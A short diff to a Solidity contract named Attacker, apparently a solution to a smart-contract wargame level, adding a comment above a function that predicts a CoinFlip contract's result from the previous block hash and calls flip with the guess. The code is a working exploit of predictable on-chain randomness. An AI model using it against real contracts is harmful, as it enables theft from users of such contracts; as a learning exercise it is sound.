@@ -13,6 +13,7 @@ contract Attacker {
         icoinFlip = ICoinFlip(_coinFlip);
     }
 
+    // Mimic the contract callculations to always predict the result
     function flipAttack() public returns(bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         return icoinFlip.flip(blockValue/FACTOR == 1);
